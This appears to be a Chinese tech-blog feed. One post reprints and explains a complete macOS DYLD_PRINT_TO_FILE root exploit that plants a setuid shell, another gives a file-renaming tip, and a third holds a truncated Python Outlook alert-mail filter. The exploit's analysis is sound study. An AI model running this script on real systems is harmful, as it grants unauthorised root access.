10.10.4</span></span><br><span class="line"><span class="comment"># (C) Copyright 2015 Stefan Esser &lt;stefan.esser@sektioneins.de&gt;</span></span><br><span class="line"><span class="comment"># Wait months for a fix from Apple or install the following KEXT as protection</span></span><br><span class="line"><span class="comment"># https://github.com/sektioneins/SUIDGuard</span></span><br><span class="line"><span class="comment"># Use at your own risk. This copies files around with root permissions,</span></span><br><span class="line"><span class="comment"># overwrites them and deletes them afterwards. Any glitch could corrupt your</span></span><br><span class="line"><span class="comment"># system. So you have been warned.</span></span><br><span class="line">SUIDVICTIM=/usr/bin/newgrp</span><br><span class="line"><span class="comment"># why even try to prevent a race condition?</span></span><br><span class="line">TARGET=`<span class="built_in">pwd</span>`/tmpXXXXX</span><br><span class="line">rm -rf <span class="variable">$TARGET</span></span><br><span class="line">mkdir <span class="variable">$TARGET</span></span><br><span class="line"></span><br><span class="line">cat &lt;&lt; <span class="string">EOF &gt; $TARGET/boomsh.c</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string">int main()&#123;</span></span><br><span class="line"><span class="string">        setuid(0);</span></span><br><span class="line"><span class="string">        setgid(0);</span></span><br><span class="line"><span class="string">        system(&quot;/bin/bash -i&quot;);</span></span><br><span class="line"><span class="string">        printf(&quot;done.\n&quot;);</span></span><br><span class="line"><span class="string">        return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">cat &lt;&lt; <span class="string">EOF &gt; $TARGET/overwrite.c</span></span><br><span class="line"><span class="string">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">int main(int argc, char **argv)&#123;</span></span><br><span class="line"><span class="string">        int fd;</span></span><br><span class="line"><span class="string">        char buffer[1024];</span></span><br><span class="line"><span class="string">        ssize_t toread, numread;</span></span><br><span class="line"><span class="string">        ssize_t numwritten;</span></span><br><span class="line"><span class="string">        ssize_t size;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        /* disable O_APPEND */</span></span><br><span class="line"><span class="string">        fcntl(3, F_SETFL, 0);</span></span><br><span class="line"><span class="string">        lseek(3, 0, SEEK_SET);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        /* write file into it */</span></span><br><span class="line"><span class="string">        fd = open(</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;\&quot;<span class="variable">$TARGET</span>/boomsh\&quot;&quot;</span> &gt;&gt; <span class="variable">$TARGET</span>/overwrite.c</span><br><span class="line">cat &lt;&lt; <span class="string">EOF &gt;&gt; $TARGET/overwrite.c</span></span><br><span class="line"><span class="string">        , O_RDONLY, 0);</span></span><br><span class="line"><span class="string">        if (fd &gt; 0) &#123;</span></span><br><span class="line"><span class="string">                /* determine size */</span></span><br><span class="line"><span class="string">                size = lseek(fd, 0, SEEK_END);</span></span><br><span class="line"><span class="string">                lseek(fd, 0, SEEK_SET);</span></span><br><span class="line"><span class="string">                while (size &gt; 0) &#123;</span></span><br><span class="line"><span class="string">                        if (size &gt; sizeof(buffer)) &#123;</span></span><br><span class="line"><span class="string">                                toread = sizeof(buffer);</span></span><br><span class="line"><span class="string">                        &#125; else &#123;</span></span><br><span class="line"><span class="string">                                toread = size;</span></span><br><span class="line"><span class="string">                        &#125;</span></span><br><span class="line"><span class="string">                        numread = read(fd, &amp;buffer, toread);</span></span><br><span class="line"><span class="string">                        if (numread &lt; toread) &#123;</span></span><br><span class="line"><span class="string">                                fprintf(stderr, &quot;problem reading\n&quot;);</span></span><br><span class="line"><span class="string">                                _exit(2);</span></span><br><span class="line"><span class="string">                        &#125;</span></span><br><span class="line"><span class="string">                        numwritten = write(3, &amp;buffer, numread);</span></span><br><span class="line"><span class="string">                        if (numread != numwritten) &#123;</span></span><br><span class="line"><span class="string">                                fprintf(stderr, &quot;problem writing\n&quot;);</span></span><br><span class="line"><span class="string">                                _exit(2);</span></span><br><span class="line"><span class="string">                        &#125;</span></span><br><span class="line"><span class="string">                        size -= numwritten;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                fsync(3);</span></span><br><span class="line"><span class="string">                close(fd);</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">                fprintf(stderr, &quot;Cannot open for reading\n&quot;);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">cp <span class="variable">$SUIDVICTIM</span> <span class="variable">$TARGET</span>/backup</span><br><span class="line">gcc -o <span class="variable">$TARGET</span>/overwrite <span class="variable">$TARGET</span>/overwrite.c</span><br><span class="line">gcc -o <span class="variable">$TARGET</span>/boomsh <span class="variable">$TARGET</span>/boomsh.c</span><br><span class="line">EDITOR=<span class="variable">$TARGET</span>/overwrite DYLD_PRINT_TO_FILE=<span class="variable">$SUIDVICTIM</span> crontab -e 2&gt; /dev/null</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;cp <span class="variable">$TARGET</span>/boomsh /usr/bin/boomsh; chmod 04755 /usr/bin/boomsh &quot;</span> | <span class="variable">$SUIDVICTIM</span> &gt; /dev/null 2&gt; /dev/null</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;cp <span class="variable">$TARGET</span>/backup <span class="variable">$SUIDVICTIM</span>&quot;</span> | /usr/bin/boomsh &gt; /dev/null 2&gt; /dev/null</span><br><span class="line">rm -rf <span class="variable">$TARGET</span></span><br><span class="line">/usr/bin/boomsh</span><br></pre></td></tr></table></figure><p>这风骚的bash姿势也是让人大开眼界，歪果仁真会玩。<br>脚本生成了两个c，第一个比较简单，先设置用户和组到root，再调用bash；第二个把第一个生成的二进制读出来再写到文件流3(DYLD_PRINT_TO_FILE)里。<br>之后脚本把newgrp(host suid)拷到临时文件，编译两个c，通过crontab(loader suid)获得高权限的3文件描述符(写到host suid)，crontab调用EDITOR把boomsh写到3(不要求特权)，然后调用被修改了的newgrp(host suid)安装boomsh并设置boomsh的suid，再调用安装好的boomsh还原newgrp，删除临时文件，执行boomsh。</p><p>这里需要提一点，虽然write的manual中说非特权账户write带suid的bin时会去除bin的suid，但得益于DYLD_PRINT_TO_FILE，loader suid进程以root打开了带suid的host bin，文件描述符继承了root级别的特权，所以对描述符的操作会被认为是root级的，所以没有触发manual中说的对write的限制，具体的细节应该类似于win下文件的context之类的吧。</p><p>开发人员的安全意识有待提高啊。</p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuc2VrdGlvbmVpbnMuZGUvZW4vYmxvZy8xNS0wNy0wNy1keWxkX3ByaW50X3RvX2ZpbGVfbHBlLmh0bWw=" title="https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html">参考链接<i class="fa fa-external-link"></i></span></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;昨晚在&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9uZXdzLzc0MTgwLmh0bWw=&quot; title=&quot;http://www.freebuf.com/news/74180.html&quot;&gt;freebuf&lt;i class=&quot;fa fa-external-link&quot;&gt;&lt;/i&gt;&lt;/span&gt;上看到一篇mac下恶意软件的分析文章，软件利用前段时间有报道过的&lt;strong&gt;DYLD_PRINT_TO_FILE&lt;/strong&gt;环境变量来实现本地提权免密码root安装。&lt;br&gt;脚本思路大致如下：&lt;/p&gt;
    
    </summary>
    
    
      <category term="tech" scheme="https://badb100d.com/categories/tech/"/>
    
    
      <category term="osx" scheme="https://badb100d.com/tags/osx/"/>
    
      <category term="macos" scheme="https://badb100d.com/tags/macos/"/>
    
  </entry>
  
  <entry>
    <title>对付以减号开头的文件</title>
    <link href="https://badb100d.com/2015/07/22/2015-07-22/"/>
    <id>https://badb100d.com/2015/07/22/2015-07-22/</id>
    <published>2015-07-22T06:22:00.000Z</published>
    <updated>2015-07-22T06:22:01.000Z</updated>
    
    <content type="html"><![CDATA[<p>linux下不小心把文件弄成  -sth  的文件名了。。。<br>上网查了查发现两种简单的方法：<br>eg:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv  --  -sth  sth</span><br></pre></td></tr></table></figure><p>或者机智的用</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv  ./-sth  sth</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;linux下不小心把文件弄成  -sth  的文件名了。。。&lt;br&gt;上网查了查发现两种简单的方法：&lt;br&gt;eg:&lt;/p&gt;
    
    </summary>
    
    
      <category term="tech" scheme="https://badb100d.com/categories/tech/"/>
    
    
      <category term="linux" scheme="https://badb100d.com/tags/linux/"/>
    
      <category term="tips" scheme="https://badb100d.com/tags/tips/"/>
    
  </entry>
  
  <entry>
    <title>outlook邮件过滤插件</title>
    <link href="https://badb100d.com/2015/07/15/2015-07-15/"/>
    <id>https://badb100d.com/2015/07/15/2015-07-15/</id>
    <published>2015-07-15T12:51:00.000Z</published>
    <updated>2015-07-15T12:51:01.000Z</updated>
    
    <content type="html"><![CDATA[<p>天天收几百封告警邮件简直不能忍，刚好最近学py，用py写了个outlook插件练练手。<br>32位outlook，32位python2.7，32位pywin32库，以pywin32关于outlook的一个插件demo作基础改了改，实在不会vba。。。<br>去除了脚本里的敏感内容，顺带注释国际化了一下，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Outlook logmail filter written by p011ux 20150630</span></span><br><span class="line"><span class="comment"># usage:</span></span><br><span class="line"><span class="comment"># python outlookAddin.py </span></span><br><span class="line"><span class="comment"># python outlookAddin.py --unregister</span></span><br><span class="line"><span class="comment"># python outlookAddin.py --debug</span></span><br><span class="line"><span class="comment"># debug info in   PythonWin --&gt; Tools --&gt; Trace Collector Debugging Tool</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> win32com <span class="keyword">import</span> universal</span><br><span class="line"><span class="keyword">from</span> win32com.server.exception <span class="keyword">import</span> COMException</span><br><span class="line"><span class="keyword">from</span> win32com.client <span class="keyword">import</span> gencache, DispatchWithEvents</span><br><span class="line"><span class="keyword">import</span> winerror</span><br><span class="line"><span class="keyword">import</span> pythoncom</span><br><span class="line"><span class="keyword">from</span> win32com.client <span class="keyword">import</span> constants</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">VersionInfo=<span class="string">u&quot;&quot;&quot;Log Filter Plugin v0.9 written by p011ux&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Forward to these email addr</span></span><br><span class="line">forwards=<span class="string">&#x27;&#x27;&#x27;alpha@company.com;beta@company.com&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># suspicious words,highlight line when match</span></span><br><span class="line">susp_words       =  u<span class="string">r&#x27;^(alpha|beta|else)\b&#x27;</span></span><br><span class="line">susp_words_white =  <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">susp_urls       =  u<span class="string">r&#x27;(://)|((\s|@)\d&#123;1,3&#125;(\.\d&#123;1,3&#125;)&#123;3&#125;)&#x27;</span></span><br><span class="line">susp_urls_white =  u<span class="string">r&#x27;\b((127(\.\d&#123;1,3&#125;)&#123;3&#125;(:(\d&#123;1,5&#125;)?)?\b)|(localhost(:\d&#123;1,5&#125;)?)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># dict of blacklists and whitelists</span></span><br><span class="line">susp_dict=&#123;</span><br><span class="line">    <span class="string">&#x27;words&#x27;</span>:(susp_words,susp_words_white),\</span><br><span class="line">    <span class="string">&#x27;urls&#x27;</span>:(susp_urls,susp_urls_white),\</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># tmp folder</span></span><br><span class="line">BotFolder=<span class="string">&quot;_log_bot&quot;</span></span><br><span class="line"><span class="comment"># destination folder</span></span><br><span class="line">TargetFolder=<span class="string">&quot;_log&quot;</span></span><br><span class="line"><span class="comment"># log sender, only handle mails from these</span></span><br><span class="line">Log_Sender=(<span class="string">&quot;alarm-a&quot;</span>,<span class="string">&quot;alarm-b&quot;</span>)</span><br><span class="line"><span class="comment"># mail forward tag, make receiver easy to filter</span></span><br><span class="line">Log_Forward_Tag=<span class="string">&#x27;[log_tag] &#x27;</span></span><br><span class="line"></span><br><span class="line">log_usr=<span class="literal">None</span>      <span class="comment"># global dest obj</span></span><br><span class="line"><span class="comment"># Support for COM objects we use.</span></span><br><span class="line">gencache.EnsureModule(<span class="string">&#x27;&#123;00062FFF-0000-0000-C000-000000000046&#125;&#x27;</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, bForDemand=<span class="literal">True</span>) <span class="comment"># Outlook 9</span></span><br><span class="line">gencache.EnsureModule(<span class="string">&#x27;&#123;2DF8D04C-5BFA-101B-BDE5-00AA0044DE52&#125;&#x27;</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, bForDemand=<span class="literal">True</span>) <span class="comment"># Office 9</span></span><br><span class="line"></span><br><span class="line">outlookApp=<span class="literal">None</span>  <span class="comment">#outlook application object</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The TLB defiining the interfaces we implement</span></span><br><span class="line">universal.RegisterInterfaces(<span class="string">&#x27;&#123;AC0714F2-3D04-11D1-AE7D-00A0C90F26F4&#125;&#x27;</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, [<span class="string">&quot;_IDTExtensibility2&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># handle content of mail,return a list which contains line numbers of matched.</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">suspicious</span>(<span class="params">item</span>):</span></span><br><span class="line">    <span class="keyword">import</span> re                             <span class="comment"># for regex</span></span><br><span class="line">    liMatched=[]</span><br><span class="line">    body=item.Body.replace(<span class="string">u&#x27;\xa0&#x27;</span>,<span class="string">u&#x27; &#x27;</span>)  <span class="comment"># replace   in html format to space</span></span><br><span class="line">    body=body.replace(<span class="string">u&#x27;\r\n&#x27;</span>,<span class="string">u&#x27;\n&#x27;</span>)      <span class="comment"># traverse lines</span></span><br><span class="line">    cnt=<span class="number">0</span>                                 <span class="comment"># line counter</span></span><br><span class="line">    <span class="keyword">for</span> eachLine <span class="keyword">in</span> body.split(<span class="string">u&#x27;\n&#x27;</span>):</span><br><span class="line">        liLine=eachLine.split()           <span class="comment"># split to words</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="number">6</span>&gt;<span class="built_in">len</span>(liLine)):                <span class="comment"># get words[5]</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="number">0</span>&lt;<span class="built_in">len</span>(liLine)):</span><br><span class="line">                <span class="built_in">print</span> <span class="built_in">len</span>(liLine),<span class="string">u&#x27;is less than 6&#x27;</span>,eachLine</span><br><span class="line">            cnt=cnt+<span class="number">1</span>                     <span class="comment"># line cnter</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        cmd=<span class="string">u&#x27;&#x27;</span>                           <span class="comment"># recover words[5:]</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> liLine[<span class="number">5</span>:]:</span><br><span class="line">            cmd+=i</span><br><span class="line">            cmd+=<span class="string">u&#x27; &#x27;</span></span><br><span class="line">        cmd=cmd[:<span class="number">-1</span>]                      <span class="comment"># remove last space</span></span><br><span class="line">        cmd=cmd.lower()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> susp_dict:</span><br><span class="line">            <span class="keyword">if</span>(<span class="literal">None</span> != re.search(susp_dict[i][<span class="number">0</span>],cmd)):                                      <span class="comment"># match blacklist</span></span><br><span class="line">                <span class="keyword">if</span>((<span class="literal">None</span> == susp_dict[i][<span class="number">1</span>]) <span class="keyword">or</span> (<span class="literal">None</span> == re.search(susp_dict[i][<span class="number">1</span>],cmd))):   <span class="comment"># if no white or not match white</span></span><br><span class="line">                    liMatched.append(cnt)                                                    <span class="comment"># get current line num</span></span><br><span class="line">                    <span class="keyword">break</span>                                                                    <span class="comment"># next line</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> <span class="string">&#x27;White list:\t&#x27;</span>,cmd                                                <span class="comment"># print out white match</span></span><br><span class="line">        cnt=cnt+<span class="number">1</span>                         <span class="comment"># line cnter</span></span><br><span class="line">    <span class="comment">#now just return</span></span><br><span class="line">    <span class="keyword">return</span> liMatched</span><br><span class="line"></span><br><span class="line"><span class="comment"># adjust font and highlight</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reform</span>(<span class="params">item,linesRed</span>):</span></span><br><span class="line">    htmB=item.HTMLBody        <span class="comment"># get content</span></span><br><span class="line">    offset=htmB.find(<span class="string">&#x27;&lt;P&gt;&#x27;</span>)   <span class="comment"># find main content</span></span><br><span class="line">    offset=offset+<span class="built_in">len</span>(<span class="string">&#x27;&lt;P&gt;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># adjust font size</span></span><br><span class="line">    sizeStr=<span class="string">&#x27;&lt;FONT SIZE=&#x27;</span>                           <span class="comment"># general setting: &lt;P&gt;&lt;FONT SIZE=2&gt;</span></span><br><span class="line">    offset=htmB.find(sizeStr)                       <span class="comment"># get FONT SIZE position</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">0</span> &lt; offset):                                 <span class="comment"># got it?</span></span><br><span class="line">        offset = offset + <span class="built_in">len</span>(sizeStr)              <span class="comment"># adjust offset</span></span><br><span class="line">        offend = htmB.find(<span class="string">&#x27;&gt;&#x27;</span>,offset)              <span class="comment"># get end pos</span></span><br><span class="line">        <span class="keyword">if</span>(offset &lt; offend):                        <span class="comment"># got end?</span></span><br><span class="line">            fontsize = <span class="built_in">int</span>(htmB[offset:offend])     <span class="comment"># get font size int</span></span><br><span class="line">            htmB = htmB[:offset]+<span class="built_in">str</span>(fontsize+<span class="number">1</span>)+htmB[offend:]    <span class="comment"># size+=1</span></span><br><span class="line">            offset = offend + <span class="built_in">len</span>(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># highlight</span></span><br><span class="line">    linesRed=<span class="built_in">sorted</span>(linesRed)           <span class="comment"># sort line nums</span></span><br><span class="line">    cnt=<span class="number">0</span>                               <span class="comment"># cnter</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span>(cnt <span class="keyword">in</span> linesRed):            <span class="comment"># match</span></span><br><span class="line">            htmB = htmB[:offset] + <span class="string">&#x27;&lt;font color=&quot;red&quot;&gt;&#x27;</span> + htmB[offset:]</span><br><span class="line">            offset = htmB.find(<span class="string">&#x27;&lt;BR&gt;&#x27;</span>,offset)</span><br><span class="line">            htmB = htmB[:offset] + <span class="string">&#x27;&lt;/font&gt;&#x27;</span> + htmB[offset:]</span><br><span class="line">            </span><br><span class="line">        offset = htmB.find(<span class="string">&#x27;\n&#x27;</span>,offset) + <span class="built_in">len</span>(<span class="string">&#x27;\n&#x27;</span>) <span class="comment"># next</span></span><br><span class="line">        cnt=cnt+<span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(cnt &gt; linesRed[<span class="number">-1</span>] <span class="keyword">or</span> offset &gt;= <span class="built_in">len</span>(htmB)):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">    item.HTMLBody=htmB</span><br><span class="line"></span><br><span class="line"><span class="comment"># handle mail item</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handleItem</span>(<span class="params">item</span>):</span></span><br><span class="line">    <span class="keyword">global</span> log_usr, outlookApp</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sender=item.SenderName</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> sender <span class="keyword">in</span> Log_Sender):</span><br><span class="line">            <span class="comment"># not alarm</span></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">        linesMatched=suspicious(item)    <span class="comment"># match</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="number">0</span>==<span class="built_in">len</span>(linesMatched)):        <span class="comment"># no match?</span></span><br><span class="line">            <span class="comment"># irrelevant log, delete</span></span><br><span class="line">            <span class="comment"># print &#x27;Deleting&#x27;,item.Subject</span></span><br><span class="line">            item.Delete()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">            </span><br><span class="line">        reform(item,linesMatched)        <span class="comment"># edit mail</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">None</span> != log_usr):        <span class="comment"># forward mail and move it to destination folder</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="number">0</span>&lt;<span class="built_in">len</span>(forwards)):</span><br><span class="line">                <span class="keyword">if</span>(<span class="literal">None</span>!=outlookApp):</span><br><span class="line">                    sendForward=outlookApp.CreateItem(constants.olMailItem)<span class="comment">#item.Forward()</span></span><br><span class="line">                    sendForward.Subject=Log_Forward_Tag+item.SenderName</span><br><span class="line">                    sendForward.To=forwards</span><br><span class="line">                    sendForward.HTMLBody=item.HTMLBody</span><br><span class="line">                    sendForward.DeleteAfterSubmit=<span class="literal">True</span></span><br><span class="line">                    sendForward.Send()   </span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> <span class="string">&#x27;outlookApp is None&#x27;</span>                </span><br><span class="line">            item=item.Move(log_usr)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;log_usr is None&#x27;</span></span><br><span class="line">    <span class="keyword">except</span> AttributeError:</span><br><span class="line">        <span class="comment"># when registered with python.exe %0 --debug , print to Python Trace Collector</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Error handling&quot;</span>, <span class="built_in">repr</span>(item),<span class="string">&quot;in FolderEvent&quot;</span></span><br><span class="line">            </span><br><span class="line"><span class="comment"># about</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ButtonEvent</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">OnClick</span>(<span class="params">self, button, cancel</span>):</span></span><br><span class="line">        <span class="comment"># print &#x27;ButtonEvent&#x27;</span></span><br><span class="line">        <span class="keyword">import</span> win32ui</span><br><span class="line">        win32ui.MessageBox(VersionInfo,<span class="string">u&quot;ABOUT&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> cancel</span><br><span class="line"></span><br><span class="line"><span class="comment"># callbacks</span></span><br><span class="line"><span class="comment"># handle mail when new mail arrived in specified folder, delete if not suspicious</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FolderEvent</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> 